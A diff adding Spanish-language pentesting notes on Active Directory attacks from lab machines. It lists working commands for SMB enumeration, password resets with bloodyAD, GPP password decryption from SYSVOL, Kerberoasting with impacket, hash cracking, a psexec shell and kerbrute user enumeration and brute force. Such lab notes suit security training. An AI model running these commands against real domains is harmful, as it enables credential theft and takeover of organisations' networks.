@@ -194,3 +194,122 @@ kerberos::golden /domain:enterprise.com /sid:ID /rc4:NTLM /user:Administrator /t
 
 ## Active directory basics (THM)
 
+Accedemos.
+
+```
+xfreerdp /u:Administrator /p:Password321 /v:10.10.224.147:3389
+```
+
+Enumerar recursos compartidos.
+
+```
+smbmap -H 10.10.224.147 -u 'Administrator' -p 'Password321' 
+```
+
+Enumerar recursos compartidos.
+
+```
+netexec smb 10.10.224.147 -u 'Administrator' -p 'Password321' --shares
+```
+
+Enumerar usuarios y servidores.
+
+```
+netexec smb 10.10.224.147 -u 'Administrator' -p 'Password321' --rid-brute
+```
+
+Cambiamos contraseña de sophie.
+
+```
+Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password')
+```
+
+También se puede cambiar de esta manera.
+
+```
+bloodyAD --host '10.10.224.147' -u 'philip' -p 'Claire2008' set password sophie 'Bea123'
+```
+
+Entrar en Group Policy Management.
+
+<figure><img src="../.gitbook/assets/image (1639).png" alt=""><figcaption></figcaption></figure>
+
+## Kerberoasting
+
+Windows solía permitir almacenar contraseñas en texto cifrado (pero fácilmente descifrable) en archivos XML dentro de políticas de grupo (GPP) en controladores de dominio. Aunque esta práctica fue desaconsejada desde hace tiempo, aún se encuentran entornos vulnerables.
+
+Utiliza la herramienta `smbmap` para conectarse al recurso compartido SMB del host con IP 10.10.10.100. A través del argumento `--download` se solicita la descarga del archivo `Groups.xml` ubicado en el directorio `Policies`, específicamente dentro de la ruta correspondiente a una política de grupo activa. Este archivo es relevante porque dentro de los controladores de dominio, las GPO pueden contener credenciales administrativas mal configuradas, particularmente dentro del directorio SYSVOL, el cual suele estar accesible para cualquier usuario del dominio, lo que representa una seria vulnerabilidad si se almacenan contraseñas en él.
+
+```
+smbmap -H 10.10.10.100 --download Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
+```
+
+Mostrar el contenido completo del archivo XML descargado.
+
+```
+cat 10.10.10.100-Replication_active.htb_Policies_{31B2F340-016D-11D2-945F-00C04FB984F9}_MACHINE_Preferences_Groups_Groups.xml
+```
+
+Desciframos.
+
+```
+gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/Ng1VmQ'
+```
+
+Si tenemos un usuario con su contraseña dentro de un dominio vemos si es vulnerable. Antes de eso sincronizamos.
+
+```
+ntpdate 10.10.10.100 (IP máquina víctima)
+```
+
+Intento obtener el Ticket Granting Service.
+
+```
+impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request
+```
+
+Crackeamos.
+
+```
+john --wordlist=rockyou.txt hash.txt
+```
+
+Teniendo la contraseña deshasheada.
+
+```
+crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968'
+```
+
+Ahora conseguir una shell.
+
+```
+impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100 cmd.exe
+```
+
+## Kerbrute
+
+{% @github-files/github-code-block url="https://github.com/ropnop/kerbrute" %}
+
+Poner `/etc/hosts`.
+
+```
+IP nombre_dominio nombre_PC nombre_PC.nombre_dominio
+```
+
+Al instalar le damos permisos de ejecución. Vemos usuarios posibles.
+
+```
+./kerbrute_linux_amd64 userenum -d cicada.htb --dc 10.10.11.71 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
+```
+
+Hacemos password-spraying.
+
+```
+./kerbrute_linux_amd64 userenum -d cicada.htb --dc 10.10.11.35 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
+```
+
+Ahora fuerza bruta de contraseñas.
+
+```
+./kerbrute_linux_amd64 bruteuser -d cicada.htb --dc 10.10.11.35 pass.txt emily.oscars
+```
